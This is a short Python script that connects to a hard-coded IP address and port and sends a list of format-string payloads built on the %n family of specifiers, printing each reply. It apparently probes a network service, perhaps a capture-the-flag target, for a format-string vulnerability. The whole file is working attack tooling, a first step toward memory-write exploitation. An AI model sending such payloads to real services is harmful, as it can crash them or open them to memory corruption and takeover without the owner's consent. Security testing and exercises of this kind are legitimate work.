#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
def test(txt):
    try:
        s=socket.socket(); s.settimeout(1.5); s.connect((HOST,PORT)); s.recv(300)
        s.send(txt.encode()+b"\n")
        d=b''
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                d+=c
        except Exception: pass
        s.close(); return d
    except Exception as e:
        return b'CONNERR'
for t in ["%n","%1$n","%hn","%hhn","%lln","%ln","AAAA%n","%c%n","%d%n","quit","%3$n","%6$n"]:
    print(repr(t),"=>",repr(test(t)))
    time.sleep(0.1)
